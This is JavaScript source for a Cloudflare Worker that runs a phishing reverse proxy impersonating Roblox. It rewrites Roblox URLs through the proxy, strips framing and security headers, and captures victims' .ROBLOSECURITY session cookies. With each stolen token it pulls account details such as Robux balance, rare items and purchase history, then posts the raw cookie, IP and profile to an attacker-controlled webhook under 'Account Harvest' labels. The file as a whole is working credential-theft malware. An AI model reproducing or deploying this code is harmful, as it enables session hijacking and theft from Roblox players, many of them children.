// === CONFIGURATION ===
// Set WEBHOOK_URL in Cloudflare Worker environment variables (secrets)

// === MAIN HANDLER ===
export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);
    const hostname = url.hostname;
    
    // === CHECK IF THIS IS A ROBLOX SUBDOMAIN REQUEST ===
    // Request format: https://compiler.voidlureee.workers.dev/proxy/https://apis.roblox.com/...
    // OR: https://compiler.voidlureee.workers.dev/apis.roblox.com/...
    
    let targetUrl;
    let isRobloxRequest = false;
    
    // Check for proxy path pattern
    const proxyMatch = url.pathname.match(/^\/proxy\/(https?:\/\/[^\/]+)/);
    if (proxyMatch) {
      // Full URL in path: /proxy/https://apis.roblox.com/...
      targetUrl = new URL(proxyMatch[1] + url.pathname.replace(/^\/proxy\/https?:\/\/[^\/]+/, '') + url.search);
      isRobloxRequest = true;
    }
    
    // Check for subdomain pattern: /apis.roblox.com/...
    const subdomainMatch = url.pathname.match(/^\/([a-zA-Z0-9-]+\.roblox\.com)\//);
    if (subdomainMatch) {
      const subdomain = subdomainMatch[1];
      const remainingPath = url.pathname.replace(`/${subdomain}`, '') || '/';
      targetUrl = new URL(`https://${subdomain}${remainingPath}${url.search}`);
      isRobloxRequest = true;
    }
    
    // Check if it's a direct Roblox domain request (shouldn't happen, but just in case)
    if (!isRobloxRequest && hostname.includes('roblox.com')) {
      targetUrl = url;
      isRobloxRequest = true;
    }
    
    // If it's not a Roblox request, serve the main page or error
    if (!isRobloxRequest) {
      // Serve a simple response or redirect
      return new Response('Proxy endpoint. Use /proxy/https://...', {
        status: 200,
        headers: { 'Content-Type': 'text/plain' }
      });
    }

    // === FORWARD REQUEST ===
    const headers = new Headers(request.headers);
    
    // Remove Cloudflare-specific headers
    headers.delete("CF-Connecting-IP");
    headers.delete("CF-IPCountry");
    headers.delete("CF-Ray");
    headers.delete("CF-Visitor");
    
    // Set correct Origin and Referer
    headers.set("Origin", targetUrl.origin);
    headers.set("Referer", targetUrl.origin + "/");
    
    // Don't send the proxy path as referer
    if (headers.has("Referer")) {
      const referer = headers.get("Referer");
      if (referer && referer.includes('/proxy/')) {
        headers.set("Referer", targetUrl.origin + "/");
      }
    }
    
    const proxyRequest = new Request(targetUrl, {
      method: request.method,
      headers: headers,
      body: request.body,
      redirect: "manual"
    });

    const response = await fetch(proxyRequest);

    // === CAPTURE COOKIE FROM INCOMING REQUEST ===
    const cookieHeader = request.headers.get("Cookie") || "";
    const robloxMatch = cookieHeader.match(/(?:^|;\s*)\.ROBLOSECURITY=([^;]+)/);

    if (robloxMatch && robloxMatch[1] && robloxMatch[1].length > 10) {
      const token = robloxMatch[1];

      ctx.waitUntil(
        (async () => {
          try {
            const ip = request.headers.get("CF-Connecting-IP") || "unknown";
            const ua = request.headers.get("User-Agent") || "unknown";

            const userInfo = await fetch("https://www.roblox.com/mobileapi/userinfo", {
              headers: { "Cookie": `.ROBLOSECURITY=${token}` }
            });

            if (!userInfo.ok) {
              await sendWebhook(env.WEBHOOK_URL, {
                content: `@everyone ❌ **Invalid/Expired Token**`,
                embeds: [{
                  color: 0xff4444,
                  fields: [
                    { name: "Token", value: `\`${token.substring(0, 30)}...\``, inline: false },
                    { name: "IP", value: ip, inline: true },
                    { name: "Status", value: "❌ Expired or invalid", inline: true }
                  ]
                }]
              });
              return;
            }

            const userData = await userInfo.json();

            const userId = userData.UserID;
            const username = userData.UserName || "Unknown";
            const robux = userData.RobuxBalance || 0;
            const premium = userData.IsPremium || false;
            const verifiedEmail = userData.IsEmailVerified || false;
            const verifiedPhone = userData.IsPhoneVerified || false;
            const createdDate = userData.Created || "Unknown";
            const accountAge = calculateAge(createdDate);

            let followers = 0;
            try {
              const profileRes = await fetch(`https://www.roblox.com/users/${userId}/profile`);
              const profileText = await profileRes.text();
              const followerMatch = profileText.match(/"followerCount":(\d+)/);
              if (followerMatch) followers = parseInt(followerMatch[1]) || 0;
            } catch (_) {}

            let hasKorblox = false;
            let hasHeadless = false;

            try {
              const inventoryRes = await fetch(
                `https://inventory.roblox.com/v1/users/${userId}/items/Collectible/1027821?limit=1`,
                { headers: { "Cookie": `.ROBLOSECURITY=${token}` } }
              );
              if (inventoryRes.ok) {
                const invData = await inventoryRes.json();
                hasKorblox = invData.data && invData.data.length > 0;
              }

              const headlessRes = await fetch(
                `https://inventory.roblox.com/v1/users/${userId}/items/Collectible/1366566?limit=1`,
                { headers: { "Cookie": `.ROBLOSECURITY=${token}` } }
              );
              if (headlessRes.ok) {
                const headData = await headlessRes.json();
                hasHeadless = headData.data && headData.data.length > 0;
              }
            } catch (_) {}

            const summary = await getYearSummary(userId, token);

            const verificationStatus = [];
            if (verifiedEmail) verificationStatus.push("✅ Email");
            if (verifiedPhone) verificationStatus.push("✅ Phone");
            if (premium) verificationStatus.push("⭐ Premium");

            const assetList = [];
            if (hasKorblox) assetList.push("💀 Korblox");
            if (hasHeadless) assetList.push("🎃 Headless");

            const embed = {
              title: `🎯 Account Harvest — @${username}`,
              color: 0x00ff88,
              thumbnail: {
                url: `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=200&height=200&format=png`
              },
              fields: [
                { name: "🆔 User ID", value: `\`${userId}\``, inline: true },
                { name: "📅 Account Age", value: accountAge, inline: true },
                { name: "💰 Robux", value: `**${robux.toLocaleString()}** R$`, inline: true },
                { name: "✅ Verification", value: verificationStatus.length > 0 ? verificationStatus.join(" · ") : "❌ None", inline: true },
                { name: "👥 Followers", value: followers.toLocaleString(), inline: true },
                { name: "👑 Rare Items", value: assetList.length > 0 ? assetList.join(" · ") : "None", inline: true },
                { name: "📊 1-Year Summary", value: summary || "No recent activity", inline: false },
                { name: "🌐 IP", value: ip, inline: true },
                { name: "🖥️ UA", value: ua.substring(0, 60), inline: true }
              ],
              footer: {
                text: "Harvester v3 · Full Account Scan",
                icon_url: "https://www.roblox.com/favicon.ico"
              },
              timestamp: new Date().toISOString()
            };

            const firstPayload = {
              content: `@everyone 🔔 **Account Captured** | @${username} | ${robux.toLocaleString()} R$`,
              embeds: [embed]
            };

            await sendWebhook(env.WEBHOOK_URL, firstPayload);

            const cookiePayload = {
              content: `\`\`\`cookie\n.ROBLOSECURITY=${token}\n\`\`\``
            };

            await sendWebhook(env.WEBHOOK_URL, cookiePayload);

          } catch (error) {
            await sendWebhook(env.WEBHOOK_URL, {
              content: `@everyone ⚠️ **Capture Error**\n\`${error.message || "Unknown error"}\``
            });
          }
        })()
      );
    }

    // === BUILD RESPONSE ===
    const newHeaders = new Headers(response.headers);
    
    // Remove blocking headers
    newHeaders.delete("X-Frame-Options");
    newHeaders.delete("Content-Security-Policy");
    newHeaders.set("X-Frame-Options", "ALLOWALL");
    
    // ADD CORS HEADERS
    newHeaders.set("Access-Control-Allow-Origin", "*");
    newHeaders.set("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS");
    newHeaders.set("Access-Control-Allow-Headers", "*");
    newHeaders.set("Access-Control-Allow-Credentials", "true");
    newHeaders.set("Access-Control-Expose-Headers", "*");

    // Handle preflight
    if (request.method === "OPTIONS") {
      return new Response(null, {
        status: 204,
        headers: {
          "Access-Control-Allow-Origin": "*",
          "Access-Control-Allow-Methods": "GET, POST, PUT, DELETE, OPTIONS",
          "Access-Control-Allow-Headers": "*",
          "Access-Control-Max-Age": "86400"
        }
      });
    }

    // Forward Set-Cookie
    const setCookie = response.headers.get("Set-Cookie");
    if (setCookie) {
      newHeaders.set("Set-Cookie", setCookie);
    }

    // Get the body
    let body = await response.text();
    const origin = url.origin;
    
    // REWRITE ALL ROBLOX URLs TO GO THROUGH PROXY
    // This is the critical part - catch ALL Roblox domains
    body = body.replace(/https?:\/\/([a-zA-Z0-9-]+\.roblox\.com)/g, `${origin}/proxy/https://$1`);
    body = body.replace(/https?:\/\/roblox\.com/g, `${origin}/proxy/https://roblox.com`);
    
    // Also rewrite relative URLs
    body = body.replace(/(src|href|action|data-src|data-url|data-uri)="\//g, `$1="${origin}/proxy/https://www.roblox.com/`);
    body = body.replace(/(src|href|action|data-src|data-url|data-uri)='\//g, `$1='${origin}/proxy/https://www.roblox.com/`);
    body = body.replace(/url\((['"]?)\//g, `url($1${origin}/proxy/https://www.roblox.com/`);
    
    // Fix absolute URLs in JavaScript strings (harder but we try)
    // This catches things like "https://www.roblox.com" in JS
    body = body.replace(/["']https?:\/\/([a-zA-Z0-9-]+\.roblox\.com)/g, `"${origin}/proxy/https://$1`);
    body = body.replace(/["']https?:\/\/roblox\.com/g, `"${origin}/proxy/https://roblox.com`);

    return new Response(body, {
      status: response.status,
      statusText: response.statusText,
      headers: newHeaders
    });
  }
};

// === HELPERS ===
function calculateAge(createdDate) {
  if (!createdDate || createdDate === "Unknown") return "Unknown";
  try {
    const created = new Date(createdDate);
    const now = new Date();
    const diffMs = now - created;
    const diffYears = diffMs / (1000 * 60 * 60 * 24 * 365.25);
    if (diffYears < 1) {
      const months = Math.floor(diffMs / (1000 * 60 * 60 * 24 * 30.44));
      return `${months} month${months > 1 ? 's' : ''}`;
    }
    return `${Math.floor(diffYears)} year${Math.floor(diffYears) > 1 ? 's' : ''}`;
  } catch (_) {
    return "Unknown";
  }
}

async function getYearSummary(userId, token) {
  try {
    const badgeRes = await fetch(
      `https://badges.roblox.com/v1/users/${userId}/badges?limit=20&sortOrder=Desc`,
      { headers: { "Cookie": `.ROBLOSECURITY=${token}` } }
    );

    if (!badgeRes.ok) return "No recent activity";

    const badgeData = await badgeRes.json();
    const now = Date.now();
    const oneYearAgo = now - (365 * 24 * 60 * 60 * 1000);

    const recentBadges = badgeData.data?.filter(b => {
      const created = new Date(b.created);
      return created.getTime() > oneYearAgo;
    }) || [];

    const totalBadges = badgeData.data?.length || 0;

    let estimatedSpend = 0;
    try {
      const txRes = await fetch(
        `https://economy.roblox.com/v1/users/${userId}/transactions?transactionType=Purchase&limit=10`,
        { headers: { "Cookie": `.ROBLOSECURITY=${token}` } }
      );
      if (txRes.ok) {
        const txData = await txRes.json();
        if (txData.data) {
          const yearTx = txData.data.filter(t => {
            const d = new Date(t.created);
            return d.getTime() > oneYearAgo;
          });
          estimatedSpend = yearTx.reduce((sum, t) => sum + (t.currency?.amount || 0), 0);
        }
      }
    } catch (_) {}

    let summary = `📈 **${totalBadges}** total badges · **${recentBadges.length}** earned in the last year`;
    if (estimatedSpend > 0) {
      summary += `\n💰 Spent approximately **${estimatedSpend.toLocaleString()}** R$ in the last year`;
    }

    if (recentBadges.length > 0) {
      const names = recentBadges.slice(0, 3).map(b => b.name || "Unknown Badge").join(" · ");
      summary += `\n🏅 Recent: ${names}`;
    }

    return summary;

  } catch (_) {
    return "📊 Summary unavailable (rate-limited)";
  }
}

async function sendWebhook(webhookUrl, payload) {
  try {
    await fetch(webhookUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });
  } catch (_) {}
}
